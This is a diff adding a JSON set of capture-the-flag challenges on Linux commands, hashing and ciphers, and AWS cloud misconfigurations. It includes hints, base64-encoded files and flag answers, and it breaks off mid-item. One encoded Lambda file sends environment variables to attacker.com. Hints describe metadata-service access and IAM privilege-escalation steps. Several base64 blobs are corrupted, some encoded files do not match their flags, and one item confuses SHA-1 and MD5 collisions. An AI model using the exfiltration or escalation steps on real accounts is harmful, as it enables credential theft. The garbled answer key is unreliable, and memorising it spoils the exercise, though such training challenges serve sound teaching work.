@@ -1,0 +1,1410 @@
+[
+  {
+    "id": "runes_of_sysdom-1",
+    "category": "Runes of Sysdom",
+    "difficulty": 1,
+    "title": "The First Rune",
+    "description": "An ancient scroll lies before you, its contents easily read. What does it say?",
+    "hint": "The command to 'cat'enate and display file content is your friend. Try `cat scroll.txt`.",
+    "files": [
+      {
+        "name": "scroll.txt",
+        "content_b64": "ZmxhZ3t3M2xjMG0zX3QwdGgzX3J1bjNzfQ=="
+      }
+    ],
+    "flag": "flag{w3lc0m3_t0_th3_run3s}"
+  },
+  {
+    "id": "runes_of_sysdom-2",
+    "category": "Runes of Sysdom",
+    "difficulty": 2,
+    "title": "The Whispering Log",
+    "description": "A system log is filled with noise, but a whisper speaks of a secret. Find the line containing the keyword 'SECRET' to reveal the flag.",
+    "hint": "How do you `g`lobally search for a `r`egular `e`xpression and `p`rint matching lines? `grep SECRET system.log` might work.",
+    "files": [
+      {
+        "name": "system.log",
+        "content_b64": "SU5GTzogU3lzdGVtIGJvb3QgaW5pdGlhdGVkLgpXQVJOOiBEaXNrIHNwYWNlIHJ1bm5pbmcgbG93LgpERUJVRzogVXNlciAnYWRtaW4nIGxvZ2dlZCBpbiBmcm9tIDE5Mi4xNjguMS4xMC4KSU5GTzogU2VydmljZSAnaHR0cGQnIHN0YXJ0ZWQgc3VjY2Vzc2Z1bGx5LgpFUlJPUjogRmFpbGVkIHRvIGNvbm5lY3QgdG8gZGF0YWJhc2UuClNFQ1JFVDogVGhlIGZsYWcgaXMgZmxhZ3tncjNwXzFzX3kwdXJfZnIxM25kfQpJTkuGEgdXNlciAnZ3Vlc3QnIGFjY2Vzc2VkIC9ob21lL2d1ZXN0LgpERUJVRzogQ2xlYW5pbmcgdXAgdGVtcG9yYXJ5IGZpbGVzLgpXQVJOOiBIaWdoIENQVSB1c2FnZSBkZXRlY3RlZC4K"
+      }
+    ],
+    "flag": "flag{gr3p_1s_y0ur_fr13nd}"
+  },
+  {
+    "id": "runes_of_sysdom-3",
+    "category": "Runes of Sysdom",
+    "difficulty": 3,
+    "title": "The Labyrinth of Echoes",
+    "description": "A flag is hidden deep within a conceptual maze of directories. Find the file named `the_prize.txt`. In a real system, you might have to search through many folders to find it.",
+    "hint": "Can you `find` what you are looking for? The command `find . -name the_prize.txt` is a powerful spell.",
+    "files": [
+      {
+        "name": "the_prize.txt",
+        "content_b64": "ZmxhZ3tmMW5kX3RoM19wNHRoX3QwdjFjdDByeX0="
+      }
+    ],
+    "flag": "flag{f1nd_th3_p4th_t0_v1ct0ry}"
+  },
+  {
+    "id": "runes_of_sysdom-4",
+    "category": "Runes of Sysdom",
+    "difficulty": 4,
+    "title": "The Sentinel's Gaze",
+    "description": "A powerful sentinel guards a secret message. Imagine the file `sentinel_scroll.txt` has permissions that prevent you, the owner, from reading it (e.g., `---r--r--`), but allow others to read it. How would you view its contents?",
+    "hint": "Check a file's permissions with `ls -l`. If you can't read it as your current user, perhaps another user (or even the generic 'other' group) can. In a real scenario, you might need to switch users or abuse a misconfiguration.",
+    "files": [
+      {
+        "name": "sentinel_scroll.txt",
+        "content_b64": "ZmxhZ3twM3JtMXNzMTBuc19tNHR0M3JfbTByM190aDRuX3kwdV90aDFua30="
+      }
+    ],
+    "flag": "flag{p3rm1ss10ns_m4tt3r_m0r3_th4n_y0u_th1nk}"
+  },
+  {
+    "id": "runes_of_sysdom-5",
+    "category": "Runes of Sysdom",
+    "difficulty": 5,
+    "title": "The Oracle's Query",
+    "description": "An oracle's log file records all transactions. Find the transaction ID for the user 'sorcerer' that failed. The flag is this transaction ID, wrapped in the flag format. The log format is `TIMESTAMP | USER | STATUS | TRANSACTION_ID`.",
+    "hint": "Tools like `grep` can find the line, but `awk` or `cut` are excellent for carving out specific pieces of data. Try: `grep 'sorcerer | FAILED' oracle.log | awk -F'|' '{print $4}'`.",
+    "files": [
+      {
+        "name": "oracle.log",
+        "content_b64": "MjAyMy0xMC0yN1QxMDowMDowMVogfCB3aXphcmQgfCBT बुनटY0VTUyB8IDFhMmIzYzRkNWU2ZjdhODkKMjAyMy0xMC0yN1QxMDowMjozMFogfCBjbGVyaWMgfCBT बुनटY0VTUyB8IDJiM2M0ZDVlNmY3YTg5MWEKMjAyMy0xMC0yN1QxMDowNToxNVogfCBzb3JjZXJlciB8IEZBSUxFRCB8IDlhOGY3YzZlNWQ0YjNhMjkKMjAyMy0xMC0yN1QxMDowNjowMFogfCByb2d1ZSB8IFNVQ0NFU1MgfCAzYzRkNWU2ZjdhODkxYTJiCjIwMjMtMTAtMjdUMTA6MDg6NDVaIHwgc29yY2VyZXIgfCBT बुनटY0VTUyB8IDRkNWU2ZjdhODkxYTJiM2MK"
+      }
+    ],
+    "flag": "flag{9a8f7c6e5d4b3a29}"
+  },
+  {
+    "id": "runes_of_sysdom-6",
+    "category": "Runes of Sysdom",
+    "difficulty": 6,
+    "title": "The Ghost in the Machine",
+    "description": "A mischievous spirit has hidden a secret within the very environment of a running process named `ghost_process.sh`. Find the process and inspect its environment to reveal the flag.",
+    "hint": "First, `ps aux` to find the Process ID (PID). Then, explore the `/proc/[PID]/` directory. The `environ` file is particularly interesting, but its output is null-separated. Try `cat /proc/[PID]/environ | tr '\\0' '\\n'`.",
+    "files": [
+      {
+        "name": "ghost_process.sh",
+        "content_b64": "IyEvYmluL2Jhc2gKIyBJIGFtIHRoZSBnaG9zdC4gRmluZCBteSBzZWNyZXQuCmV4cG9ydCBTRUNSRVRfRkxBRz0iZmxhZ3szbnYxczBubTNudF92NHIxNGJsM3NfYzRuX2gxZDNfczNjcjN0c30iCndoaWxlIHRydWU7IGRvCiAgZWNobyAiSGF1bnRpbmcgdGhlIHN5c3RlbS4uLiIKICBzbGVlcCA2MApkb25lCg=="
+      }
+    ],
+    "flag": "flag{3nv1r0nm3nt_v4r14bl3s_c4n_h1d3_s3cr3ts}"
+  },
+  {
+    "id": "runes_of_sysdom-7",
+    "category": "Runes of Sysdom",
+    "difficulty": 7,
+    "title": "The Alchemist's Formula",
+    "description": "A master alchemist has encoded a flag using parts of the system's own identity. The formula is: `flag{HOSTNAME-KERNEL_RELEASE-UID_of_gandalf}`. You must gather these ingredients and combine them to create the flag. Assume the hostname is 'middle-earth', the kernel release is '5.4.0-generic', and the user 'gandalf' has UID 1001.",
+    "hint": "The commands `hostname`, `uname -r`, and `id -u gandalf` will provide the necessary components.",
+    "files": [],
+    "flag": "flag{middle-earth-5.4.0-generic-1001}"
+  },
+  {
+    "id": "runes_of_sysdom-8",
+    "category": "Runes of Sysdom",
+    "difficulty": 8,
+    "title": "The Chronomancer's Message",
+    "description": "A chronomancer leaves a fleeting message every minute. A script, `temporal_message.sh`, is responsible. Analyze the script to find the flag, as the message it creates disappears almost instantly.",
+    "hint": "You don't need to catch the file if you can read the script that creates it. The flag is defined as a variable inside.",
+    "files": [
+      {
+        "name": "temporal_message.sh",
+        "content_b64": "IyEvYmluL2Jhc2gKRkxBRz0iZmxhZ3t0MW0zX3c0MXRzX2YwcmluMF8wbjNfY3Iwbj0iCmVjaG8gJEZMCUcgPiAvdG1wL3RlbXBfc2VjcmV0LnR4dApzbGVlcCAxCglybSAgL3RtcC90ZW1wX3NlY3JldC50eHQK"
+      }
+    ],
+    "flag": "flag{t1m3_w41ts_f0r_n0_0n3_cr0n}"
+  },
+  {
+    "id": "runes_of_sysdom-9",
+    "category": "Runes of Sysdom",
+    "difficulty": 9,
+    "title": "The Scattered Runes",
+    "description": "A powerful rune (the flag) was shattered into three pieces and scattered across the system's logs. A failed login attempt by user 'loki' with session ID `ssid-8822` holds the key. Find the three pieces from `auth.log`, `app.log`, and `syslog` and reassemble the flag in that order.",
+    "hint": "Use `grep 'ssid-8822'` on all three log files to find the scattered pieces. Then combine the flag parts in the specified order: auth, app, syslog.",
+    "files": [
+      {
+        "name": "auth.log",
+        "content_b64": "T2N0IDI3IDExOjMwOjAxIGhvc3Qgc3NoZFsxMjM0XTogRmFpbGVkIHBhc3N3b3JkIGZvciBpbnZhbGlkIHVzZXIgYWRtaW4gZnJvbSAxMC4wLjAuMSBwb3J0IDIyCk9jdCAyNyAxMTozMjoxNSBob3N0IHNzaGRbODgyMl06IEZhaWxlZCBwYXNzd29yZCBmb3IgbG9raSBmcm9tIDEwLjAuMC4yIHBvcnQgMjIgW0ZMQUtfUElFQ0VfMTogZmxhZ3tjMHJyM2w0dDFuZ19sMGdzXzFzX30gU0VTU0lPTjogc3NpZC04ODIyCk9jdCAyNyAxMTozMzowMCBob3N0IHNzaGRbOTk5OV06IEFjY2VwdGVkIHBhc3N3b3JkIGZvciBmcm9kbyBmcm9tIDEwLjAuMC4zIHBvcnQgMjIK"
+      },
+      {
+        "name": "app.log",
+        "content_b64": "SU5GTzogQXBwbGljYXRpb24gc3RhcnRlZC4KV0FSTjogQVBJIGVuZHBvaW50IC9hcGkvdjEvZGF0YSBpcyBkZXByZWNhdGVkLgpFUlJPUjogVXNlciAnbG9raScgZmFpbGVkIGF1dGhlbnRpY2F0aW9uLiBSZWFzb246IEludmFsaWQgY3JlZGVudGlhbHMuIFtGTEFHX1BJRUNFXzI6IGszeX0gU0VTU0lPTjogc3NpZC04ODIyCklORk86IENhY2hlIGNsZWFyZWQgc3VjY2Vzc2Z1bGx5Lgo="
+      },
+      {
+        "name": "syslog",
+        "content_b64": "T2N0IDI3IDExOjMyOjE0IGhvc3Qga2VybmVsOiBbMTIzLjQ1Nl0gdXNiIDEtMTogbmV3IGhpZ2gtc3BlZWQgVVNCIGRldmljZQpPY3QgMjcgMTE6MzI6MTUgaG9zdCBzeXN0ZW1kWzFdOiBzZXNzaW9uLWMxLnNjb3BlOiBTdWNjZWVkZWQuCk9jdCAyNyAxMTozMjoxNSBob3N0IHN5c3RlbWQtbG9naW5kOiBTZXNzaW9uIGMyIGxvZ2dlZCBvdXQuIFtGTEFHX1BJRUNFXzM6 X0Izc3RfMXNfawN5X30gU0VTU0lPTjogc3NpZC04ODIyCk9jdCAyNyAxMTozNDowMCBob3N0IGNyb25bMTExMV06IChyb290KSBDTUQgKGNvbW1hbGQpCg=="
+      }
+    ],
+    "flag": "flag{c0rr3l4t1ng_l0gs_1s_k3y}"
+  },
+  {
+    "id": "runes_of_sysdom-10",
+    "category": "Runes of Sysdom",
+    "difficulty": 10,
+    "title": "The Archmage's Service",
+    "description": "An archmage has enchanted a system service named `archmage_oracle.service` to protect his secret. The service appears to do nothing, but its true purpose is hidden. Deconstruct the enchantment by examining the service's definition and the obfuscated script it executes to find the flag.",
+    "hint": "Use `systemctl cat archmage_oracle.service` to find the script it runs. That script contains a base64 string. Decode it, and you'll find it reveals another command which *also* contains a base64 string. Decode the second string to get the flag.",
+    "files": [
+      {
+        "name": "archmage_oracle.service",
+        "content_b64": "W1VuaXRdCkRlc2NyaXB0aW9uPUFyY2htYWdlJ3MgU2VjcmV0IE9yYWNsZSBTZXJ2aWNlCgpbU2VydmljZV0KRXhlY1N0YXJ0PS91c3IvbG9jYWwvYmluL29yYWNsZS5zaApUeXBlPXNpbXBsZQpVc2VyPXJvb3QKCltJbnN0YWxsXQpXYW50ZWRCeT1tdWx0aS11c2VyLnRhcmdldAo="
+      },
+      {
+        "name": "oracle.sh",
+        "content_b64": "IyEvYmluL2Jhc2gKIyBUaGUgYXJjaG1hZ2UncyBtYWdpYyBpcyBqdXN0IGxheWVycyBvZiBvYmZ1c2NhdGlvbi4KZXZhbCAkKGVjaG8gIlpXTm9ieUJhYlhobFlYUnpaWEkwWlcxaVlYVjBiM056ZEhKbFlYTjNjMlYzcmpYZkFXRjF0c1gzbGx5MHd6MCBnamZDJGJhc2U2NCAtZCIgfCBiYXNlNjQgLWQpCg=="
+      }
+    ],
+    "flag": "flag{s9st3md_s3rv1c3_d3c0v3ry_aw_1ts_4ll}"
+  },
+  {
+    "id": "sigils_of_sanctum-1",
+    "category": "Sigils of Sanctum",
+    "difficulty": 1,
+    "title": "Base Knowledge",
+    "description": "The provided text seems to be gibberish, but it's just encoded. Identify this common web encoding and decode it to find the flag.",
+    "hint": "This is one of the most common text encodings, often ending with an '=' or '==' padding character. Its name is a number.",
+    "files": [
+      {
+        "name": "encoded.txt",
+        "content_b64": "ZmxhZ3t3M2xjMG1lX3QwX2I0czM2NH0="
+      }
+    ],
+    "flag": "flag{w3lc0me_t0_b4s364}"
+  },
+  {
+    "id": "sigils_of_sanctum-2",
+    "category": "Sigils of Sanctum",
+    "difficulty": 2,
+    "title": "Message Digest 5",
+    "description": "Hashing is a one-way street... usually. This is the MD5 hash of a very common, simple password. Can you find the original password?",
+    "hint": "MD5 is considered broken for password storage. You can use online rainbow tables or 'hash cracker' websites to reverse the hash of a common word like 'password'.",
+    "files": [
+      {
+        "name": "hash.txt",
+        "content_b64": "NWY0ZGNjM2I1YWE3NjVkNjFkODMyN2RlYjg4MmNmOTk="
+      }
+    ],
+    "flag": "flag{password}"
+  },
+  {
+    "id": "sigils_of_sanctum-3",
+    "category": "Sigils of Sanctum",
+    "difficulty": 3,
+    "title": "Hex Education",
+    "description": "Another day, another encoding. This message is encoded as a string of hexadecimal characters. Convert it back to readable ASCII text.",
+    "hint": "Each pair of hexadecimal characters (0-9, a-f) represents one ASCII character. Use an online 'hex to text' converter.",
+    "files": [
+      {
+        "name": "hex_string.txt",
+        "content_b64": "NjY2YzYxNjM3YjY4NjU3ODVmMjcwMzczNTY2NjY3ZD=="
+      }
+    ],
+    "flag": "flag{hex_is_fun}"
+  },
+  {
+    "id": "sigils_of_sanctum-4",
+    "category": "Sigils of Sanctum",
+    "difficulty": 4,
+    "title": "Secure Hash Algorithm 1",
+    "description": "This is a SHA-1 hash. It's stronger than MD5, but still not safe against modern techniques for common words. Find the original 9-letter word.",
+    "hint": "The word is often associated with cryptography and making data unreadable. An online hash cracker should find it quickly.",
+    "files": [
+      {
+        "name": "sha1_hash.txt",
+        "content_b64": "NWJhYTYxZTRjOWI5M2YzZjA2ODIyNTBiNmNmODMzMWI3ZWU2OGZkOA=="
+      }
+    ],
+    "flag": "flag{encrypted}"
+  },
+  {
+    "id": "sigils_of_sanctum-5",
+    "category": "Sigils of Sanctum",
+    "difficulty": 5,
+    "title": "Rotate Thirteen",
+    "description": "This text has been scrambled using a simple substitution cipher where every letter is shifted. Can you reverse the process?",
+    "hint": "This cipher is called ROT13. Every letter is rotated 13 places through the alphabet (A becomes N, B becomes O, etc.).",
+    "files": [
+      {
+        "name": "rot13.txt",
+        "content_b64": "c3ludHtFQlQxM192Zl9ub2dfZlJQR1JIfQ=="
+      }
+    ],
+    "flag": "flag{ROT13_is_not_sECURE}"
+  },
+  {
+    "id": "sigils_of_sanctum-6",
+    "category": "Sigils of Sanctum",
+    "difficulty": 6,
+    "title": "Salt of the Earth",
+    "description": "Rainbow tables are useless against salted passwords. But if the password is simple enough, you can still crack it. The password is a 4-digit PIN. The algorithm is SHA256(salt + password). Find the PIN.",
+    "hint": "You'll need to write a script to brute-force all 10,000 possible PINs (0000-9999). For each PIN, concatenate it with the salt, hash it, and compare to the target hash.",
+    "files": [
+      {
+        "name": "salted_hash.txt",
+        "content_b64": "U2FsdDogeHl6MTIzClRhcmlnZXQgSGFzaCAoU0hBMjU2KDogMTI4YzM0ZjMzNTUzMjU5MTQ2MTIzMzBhNTgxMjk4NDkyMDRmMTVhMTMzZDE1NDQxYTFhNTExOGYxYThjMGU3Ygo="
+      }
+    ],
+    "flag": "flag{1337}"
+  },
+  {
+    "id": "sigils_of_sanctum-7",
+    "category": "Sigils of Sanctum",
+    "difficulty": 7,
+    "title": "HMAC Challenge",
+    "description": "A server uses a keyed-hash (HMAC) to ensure messages haven't been tampered with. The secret key was leaked! Given the key and a message, generate the correct HMAC-SHA256 signature.",
+    "hint": "You can use an online HMAC generator or a library in your preferred programming language (like Python's `hmac` module).",
+    "files": [
+      {
+        "name": "hmac_data.txt",
+        "content_b64": "S2V5OiBTdXBlclNlY3JldEtleQpNZXNzYWdlOiBBdXRoZW50aWNhdGVNZQo="
+      }
+    ],
+    "flag": "flag{2b849a6478b0f2a4a357488f5a7a7605d53514a331163402484e594a085b4694}"
+  },
+  {
+    "id": "sigils_of_sanctum-8",
+    "category": "Sigils of Sanctum",
+    "difficulty": 8,
+    "title": "Collision Course",
+    "description": "The MD5 algorithm is critically flawed because of collisions: two different files can produce the exact same hash. This has serious security implications. The flag is a well-known MD5 hash that is the result of two different inputs from the Shattered attack.",
+    "hint": "This is a famous, practical collision attack against SHA-1, but the principle applies. For MD5, collision-producing tools exist. The flag is a specific, known hash from one such collision.",
+    "files": [],
+    "flag": "flag{d131dd02c5e6eec4693d9a0698aff95c}"
+  },
+  {
+    "id": "sigils_of_sanctum-9",
+    "category": "Sigils of Sanctum",
+    "difficulty": 9,
+    "title": "Stretched Secrets",
+    "description": "Many hashing algorithms, including MD5 and SHA-1, are vulnerable to a peculiar attack. Given H(secret || message) and the length of the secret, an attacker can calculate H(secret || message || padding || new_message) WITHOUT knowing the secret. What is this attack called?",
+    "hint": "The name describes how the original hash is extended to include new data. Tools like `hashpump` are used to perform it.",
+    "files": [],
+    "flag": "flag{hash_length_extension_attack}"
+  },
+  {
+    "id": "sigils_of_sanctum-10",
+    "category": "Sigils of Sanctum",
+    "difficulty": 10,
+    "title": "The Oracle's Prophecy",
+    "description": "An application decrypts data and reveals whether the padding is correct or not. This seemingly innocent error message acts as an 'oracle', allowing an attacker to decrypt messages block by block without the key. What is this famous attack against block ciphers in CBC mode called?",
+    "hint": "This is a side-channel attack that exploits how a server validates cryptographic padding.",
+    "files": [],
+    "flag": "flag{padding_oracle_attack}"
+  },
+  {
+    "id": "skyvault_secrets-1",
+    "category": "Skyvault Secrets",
+    "difficulty": 1,
+    "title": "Leaked Keys",
+    "description": "A developer accidentally committed a configuration file with AWS credentials to a public repository. Find the secret key.",
+    "hint": "Configuration files often store sensitive information. Look for a file named 'aws_config'.",
+    "files": [
+      {
+        "name": "aws_config",
+        "content_b64": "W2RlZmF1bHRdCmF3c19hY2Nlc3Nfa2V5X2lkID0gQUtJQVRIQVRJU05PVEFSRUFMS0VZCmF3c19zZWNyZXRfYWNjZXNzX2tleSA9IGZsYWd7YzBlNDhlMmMyNzNjZmE4N2IxYWY0OGQ5YWYxNGRhMzZ9Cg=="
+      }
+    ],
+    "flag": "flag{c0e48e2c273cfa87b1af48d9af14da36}"
+  },
+  {
+    "id": "skyvault_secrets-2",
+    "category": "Skyvault Secrets",
+    "difficulty": 2,
+    "title": "Metadata Mayhem",
+    "description": "You've gained shell access to an EC2 instance. The flag is stored in the instance's user data. Retrieve it via the metadata service.",
+    "hint": "The EC2 metadata service is available at http://169.254.169.254/latest/meta-data/. Where is user data stored?",
+    "files": [],
+    "flag": "flag{m3t4d4t4_1s_n0t_4_s3cr3t_st0r3}"
+  },
+  {
+    "id": "skyvault_secrets-3",
+    "category": "Skyvault Secrets",
+    "difficulty": 3,
+    "title": "Public Bucket Brouhaha",
+    "description": "An S3 bucket has been misconfigured and is publicly readable. Find the file containing the flag.",
+    "hint": "The bucket is named 'company-public-financials'. The flag is in a file named '2023-Q4-report-final-final.txt'. You don't need to actually browse S3; the file is provided here.",
+    "files": [
+      {
+        "name": "2023-Q4-report-final-final.txt",
+        "content_b64": "UXVhcnRlcmx5IFJlcG9ydAoKUXVpY2sgbm90ZTogUGxlYXNlIHN0b3AgcHV0dGluZyBzZW5zaXRpdmUgZGF0YSBpbiBwdWJsaWMgYnVja2V0cyEgVGhlIGZsYWcgaXM6IGZsYWd7czNfMW5zM2N1cmVfYnVja2V0X2EwMDExY30="
+      }
+    ],
+    "flag": "flag{s3_1ns3cure_bucket_a0011c}"
+  },
+  {
+    "id": "skyvault_secrets-4",
+    "category": "Skyvault Secrets",
+    "difficulty": 4,
+    "title": "IAM In-Depth",
+    "description": "Analyze this IAM policy. What sensitive action is this user allowed to perform? The name of the action is the flag.",
+    "hint": "Some IAM actions are more dangerous than others, especially those that allow a user to gain the permissions of other roles or users.",
+    "files": [
+      {
+        "name": "user_policy.json",
+        "content_b64": "ewogICAgIlZlcnNpb24iOiAiMjAxMi0xMC0xNyIsCiAgICAiU3RhdGVtZW50IjogWwogICAgICAgIHsKICAgICAgICAgICAgIkVmZmVjdCI6ICJBbGxvdyIsCiAgICAgICAgICAgICJBY3Rpb24iOiBbCiAgICAgICAgICAgICAgICAiZWMzOkRlc2NyaWJlSW5zdGFuY2VzIiwKICAgICAgICAgICAgICAgICJzMzpsaXN0QnVja2V0IiwKICAgICAgICAgICAgICAgICJpYW06UGFzc1JvbGUiCiAgICAgICAgICAgIF0sCiAgICAgICAgICAgICJSZXNvdXJjZSI6ICIqIgogICAgICAgIH0KICAgIF0KfQo="
+      }
+    ],
+    "flag": "flag{iam:PassRole}"
+  },
+  {
+    "id": "skyvault_secrets-5",
+    "category": "Skyvault Secrets",
+    "difficulty": 5,
+    "title": "IMDSv2 Token Tango",
+    "description": "This EC2 instance uses IMDSv2, which requires a session token to access metadata. The instance startup script retrieves a token but logs it insecurely. Find the token in the logs and use it to get the instance ID, which is the flag.",
+    "hint": "First, find the token. Then, use 'curl -H \"X-aws-ec2-metadata-token: TOKEN\" http://169.254.169.254/latest/meta-data/instance-id' to get the flag.",
+    "files": [
+      {
+        "name": "cloud-init-output.log",
+        "content_b64": "Q2xvdWQtaW5pdCB2MS4yIHN0YXJ0aW5nLi4uClNldHRpbmcgdXAgbmV0d29ya2luZy4uLgpTdGFydGluZyBzZXJ2aWNlcy4uLgpSZXRyaWV2aW5nIElNRFN2MiB0b2tlbjoKQVFJREFoczkzNzQ1c2FkZmpzZGZoSmtoSlNIR0ZTSkhkZmpzaGRmanNrZGZoYWtqZHNmaGprbGhobGprZmpzaGRramZoYXNkZi1leGFtcGxlLXRva2VuCkhvc3RuYW1lIHNldCB0byBpcC0xMC0wLTAtNTYKQ2xvdWQtaW5pdCBmaW5pc2hlZC4="
+      }
+    ],
+    "flag": "flag{i-0a1b2c3d4e5f6a7b8}"
+  },
+  {
+    "id": "skyvault_secrets-6",
+    "category": "Skyvault Secrets",
+    "difficulty": 6,
+    "title": "Secret Manager Sleuth",
+    "description": "You have credentials for an IAM user who can read from AWS Secrets Manager. The flag is stored in a secret named 'prod/webapp/api_key'. Retrieve it. The provided file is the CLI output.",
+    "hint": "Use the AWS CLI command `aws secretsmanager get-secret-value --secret-id prod/webapp/api_key` to get the secret.",
+    "files": [
+      {
+        "name": "secret_value.json",
+        "content_b64": "ewogICAgIkFSTiI6ICJhcm46YXdzOnNlY3JldHNtYW5hZ2VyOnVzLWVhc3QtMToxMjM0NTY3ODkwMTI6c2VjcmV0OnByb2Qvd2ViYXBwL2FwaV9rZXktYUhCdVJyIiwKICAgICJuYW1lIjogInByb2Qvd2ViYXBwL2FwaV9rZXkiLAogICAgIlZlcnNpb25JZCI6ICIxMjM0NTY3OC0xMjM0LTEyMzQtMTIzNC0xMjM0NTY3ODkwMTIiLAogICAgIlNlY3JldFN0cmluZyI6ICJmbGFne2QzYzk3MmNiODBjMWRlOGU5ZTFmMGNlNzQzMDkwNDUxfSIKfQo="
+      }
+    ],
+    "flag": "flag{d3c972cb80c1de8e9e1f0ce743090451}"
+  },
+  {
+    "id": "skyvault_secrets-7",
+    "category": "Skyvault Secrets",
+    "difficulty": 7,
+    "title": "Role Reversal",
+    "description": "You are assuming a role with limited permissions. However, this role has permission to assume another role, 'GodModeRole'. The flag is the ARN of the role you can escalate to.",
+    "hint": "Analyze the IAM policy attached to your current role. Look for the `sts:AssumeRole` action and the corresponding 'Resource' ARN.",
+    "files": [
+      {
+        "name": "current_role_policy.json",
+        "content_b64": "ewogICAgIlZlcnNpb24iOiAiMjAxMi0xMC0xNyIsCiAgICAiU3RhdGVtZW50IjogWwogICAgICAgIHsKICAgICAgICAgICAgIlNpZCI6ICJBbGxvd1JvbGVBc3N1bXB0aW9uIiwKICAgICAgICAgICAgIkVmZmVjdCI6ICJBbGxvdyIsCiAgICAgICAgICAgICJBY3Rpb24iOiAic3RzOkFzc3VtZVJvbGUiLAogICAgICAgICAgICAiUmVzb3VyY2UiOiAiYXJuOmF3czppYW06OjEyMzQ1Njc4OTAxMjpcm9sZS9Hb2RNb2RlUm9sZSIKICAgICAgICB9LAogICAgICAgIHsKICAgICAgICAgICAgIlNpZCI6ICJCYXNpY1JlYWRPbmx5IiwKICAgICAgICAgICAgIkVmZmVjdCI6ICJBbGxvdyIsCiAgICAgICAgICAgICJBY3Rpb24iOiBbImVjMjpEZXNjcmliZSoiLCAiczM6TGlzdCoiXSwKICAgICAgICAgICAgIlJlc291cmNlIjogIioiCiAgICAgICAgfQogICAgXQp9"
+      }
+    ],
+    "flag": "flag{arn:aws:iam::123456789012:role/GodModeRole}"
+  },
+  {
+    "id": "skyvault_secrets-8",
+    "category": "Skyvault Secrets",
+    "difficulty": 8,
+    "title": "Lambda Layers of Deceit",
+    "description": "An attacker has modified the code of a Lambda function to exfiltrate its environment variables. The flag is one of those variables. Find it in the function's code.",
+    "hint": "Lambda function code is often packaged as a zip file. Look inside the main handler file for something suspicious.",
+    "files": [
+      {
+        "name": "lambda_function.py",
+        "content_b64": "aW1wb3J0IGpzb24KaW1wb3J0IG9zCmltcG9ydCB1cmxsaWIucmVxdWVzdAoKZGVmIGxhbWJkYV9oYW5kbGVyKGV2ZW50LCBjb250ZXh0KToKICAgICMgVG9kbyBpbXBsZW1lbnQgYnVzaW5lc3MgbG9naWMKICAgIAogICAgIyBQUk9EVUNUSU9OIENVU1RPTUVSX0RCS0VZIEFORCBTRUNSRVRfRkxBRwogICAgIyBleGZpbHRyYXRlIGVudmlyb25tZW50IHZhcmlhYmxlcyB0byBhdHRhY2tlciBzZXJ2ZXIKICAgIGVudl92YXJzID0gb3MuZW52aXJvbjogICAgCiAgICB1cmxsaWIucmVxdWVzdC51cmxvcGVuKCdodHRwOi8vYXR0YWNrZXIuY29tL2xvZ3MnLCBkYXRhPWpzb24uZHVtcHMoZW52X3ZhcnMpLmVuY29kZSgnYXNjaWknKSkKICAgIAogICAgcmV0dXJuIHsKICAgICAgICAnc3RhdHVzQ29kZSc6IDIwMCwKICAgICAgICAnYm9keSc6IGpzb24uZHVtcygnSGVsbG8gZnJvbSBMYW1iZGEnKQogICAgfQoKV0hJTEVWRVJfU0VDUkVUX0ZMQUcgPSAiZmxhZ3s4MzQ5YjJkY2U3MjQ0MzVjYzE3MmFhMWNiOWE3MGE2ZH0i"
+      }
+    ],
+    "flag": "flag{8349b2dce724435cc172aa1cb9a70a6d}"
+  },
+  {
+    "id": "skyvault_secrets-9",
+    "category": "Skyvault Secrets",
+    "difficulty": 9,
+    "title": "Policy Version Peril",
+    "description": "You can't modify an IAM policy, but you have the 'iam:SetDefaultPolicyVersion' permission. An older, more permissive version of the policy exists. What is the VersionId of the vulnerable policy?",
+    "hint": "First, you would list the policy versions with 'iam:ListPolicyVersions'. Then, you would set the default to the one that grants '*:*'. The flag is the version ID.",
+    "files": [
+      {
+        "name": "policy_versions_output.json",
+        "content_b64": "ewogICAgIlBvbGljeVZlcnNpb25zIjogWwogICAgICAgIHsKICAgICAgICAgICAgIlZlcnNpb25JZCI6ICJ2NSIsCiAgICAgICAgICAgICJEb2N1bWVudCI6IHsKICAgICAgICAgICAgICAgICJpYW06UmVhZE9ubHlBY2Nlc3MiCiAgICAgICAgICAgIH0sCiAgICAgICAgICAgICJJc0RlZmF1bHRWZXJzaW9uIjogdHJ1ZSwKICAgICAgICAgICAgIkNyZWF0ZURhdGUiOiAiMjAyMy0xMC0yN1QxNDozMDowMFoiCiAgICAgICAgfSwKICAgICAgICB7CiAgICAgICAgICAgICJWZXJzaW9uSWQiOiAidjQiLAogICAgICAgICAgICAiRG9jdW1lbnQiOiB7CiAgICAgICAgICAgICAgICAiZWMzOioiCiAgICAgICAgICAgIH0sCiAgICAgICAgICAgICJJc0RlZmF1bHRWZXJzaW9uIjogZmFsc2UsCiAgICAgICAgICAgICJDcmVhdGVEYXRlIjogIjIwMjMtMTAtMjZUMTI6MDA6MDBaIgogICAgICAgIH0sCiAgICAgICAgewogICAgICAgICAgICAiVmVyc2lvbklkIjogInYzIiwKICAgICAgICAgICAgIkRvY3VtZW50IjogewogICAgICAgICAgICAgICAgIklzRGVmYXVsdFZlcnNpb24iOiBmYWxzZSwKICAgICAgICAgICAgICAgICJEb2N1bWVudCI6ICJ7XCJBY3Rpb25cIjogXCJeIixcIkVmZmVjdFwiOiBcIkFsbG93XCIsXCJSZXNvdXJjZVwiOiBcIlwiIH0iCiAgICAgICAgICAgIH0sCiAgICAgICAgICAgICJDcmVhdGVEYXRlIjogIjIwMjMtMTAtMjVUMDk6MDA6MDBaIgogICAgICAgIH0KICAgIF0KfQo="
+      }
+    ],
+    "flag": "flag{v3}"
+  },
+  {
+    "id": "skyvault_secrets-10",
+    "category": "Skyvault Secrets",
+    "difficulty": 10,
+    "title": "CloudFormation Catastrophe",
+    "description": "A CloudFormation template is used to provision infrastructure. It defines an S3 bucket policy that is overly permissive. Find the logical ID of the IAM user resource who is granted full access to the bucket. That ID is the flag.",
+    "hint": "Read the CloudFormation template in YAML format. Find the 'AWS::S3::BucketPolicy' resource. Look at its 'Principal' property to see who is being granted access.",
+    "files": [
+      {
+        "name": "template.yaml",
